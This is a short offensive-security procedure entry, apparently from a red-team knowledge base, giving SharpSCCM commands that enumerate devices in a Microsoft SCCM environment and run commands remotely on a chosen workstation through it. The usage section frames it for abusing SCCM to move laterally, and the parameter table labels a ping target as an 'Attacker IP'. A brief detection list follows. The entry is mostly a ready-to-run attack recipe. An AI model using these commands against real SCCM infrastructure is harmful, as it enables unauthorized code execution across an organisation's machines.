---
id: 36d84fb9-a15b-4fa3-8769-d2dd10161d0b
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:08.125413+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - sccm
  - execution
validated: true
---

# Execute-command-on-SCCM-device-using-SharpSCCM

## Code

```powershell
.\SharpSCCM.exe get device --server <SERVER_NAME> --site-code <SITE_CODE>
.\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
.\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
```

## Description

This PowerShell code snippet uses SharpSCCM to query device details from SCCM and execute remote commands on specified devices via the SCCM infrastructure. It first retrieves device info, then sets up execution with a relay, and finally runs a sample ping command silently with debug output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <SERVER_NAME> | SCCM server FQDN | sccm.contoso.com |
| <SITE_CODE> | SCCM site code | PR1 |
| <device_name> | Target device name | WS01 |
| <relay_server_ip> | IP for relay server | 192.168.1.100 |
| 10.10.10.10 | Sample target IP for ping | Attacker IP |

## Usage

Run from a machine with SCCM access to enumerate and execute on remote devices. Useful for initial command execution before full app deployment. Integrate into procedures abusing SCCM for lateral movement.

## Detection

- Monitor SCCM exec logs for anomalous commands like ping to external IPs.
- WMI event logs for SharpSCCM queries.
- Network traffic to relay IPs from SCCM servers.

## Related

- [[procedures/Create-and-Deploy-Malicious-Application-via-SCCM]]
